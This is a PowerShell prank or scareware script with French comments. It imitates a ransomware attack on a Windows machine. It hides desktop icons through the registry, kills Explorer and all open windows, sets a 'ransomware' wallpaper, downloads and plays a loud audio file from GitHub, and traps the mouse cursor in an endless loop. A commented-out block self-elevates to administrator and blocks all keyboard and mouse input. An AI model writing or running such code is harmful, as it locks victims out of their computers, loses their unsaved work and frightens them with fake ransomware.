  
  # desactiver inputs
  <#
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }

$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru

function Disable-UserInput($seconds) {
    $userInput::BlockInput($true)
    Start-Sleep $seconds
    $userInput::BlockInput($false)
}

Disable-UserInput -seconds 30 | Out-Null
#>

# fonction pour changer le fond d'ecran
Function Set-WallPaper($Image) {
  New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value "10"  -Force 
  Add-Type -TypeDefinition @"
  using System; 
  using System.Runtime.InteropServices;
  public class Params 
  { 
      [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
      public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam,String lpvParam,Int32 fuWinIni); 
  }
"@ 
    
      $SPI_SETDESKWALLPAPER = 0x0014
      $UpdateIniFile = 0x01
      $SendChangeEvent = 0x02
      $fWinIni = $UpdateIniFile -bor $SendChangeEvent
      $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
  }
  
  #cense cacher la taskbar mais ça marche pas
  Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Search -Name SearchBoxTaskbarMode -Value 0 -Type DWord -Force

  $WebClient = New-Object System.Net.WebClient
  $WebClient.DownloadFile("https://github.com/MilkrosoftWindows/tkt_poto_walah_c_pa_un_virus/raw/main/monster-inc-mike-wazowski-theme-song-earrape-best-version.mp3", "C:\zic.mp3")

  $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\" 
  Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1 # cacher icones desktop
  Get-Process "explorer" | Stop-Process
  
  # Changer fond d'ecran vers image ransomware
  Set-WallPaper -Image "C:\system32.png"
  
  #fermer fenetres ouvertes
  Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | stop-process
  
  Add-Type -AssemblyName System.Windows.Forms

Add-Type -AssemblyName presentationCore
$mediaPlayer = New-Object system.windows.media.mediaplayer
$mediaPlayer.open('C:\zic.mp3')
$mediaPlayer.Play()

while ($true)
{
  $Pos = [System.Windows.Forms.Cursor]::Position
  $x = 5000
  $y = 0
  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
  #Start-Sleep -Seconds 10
}
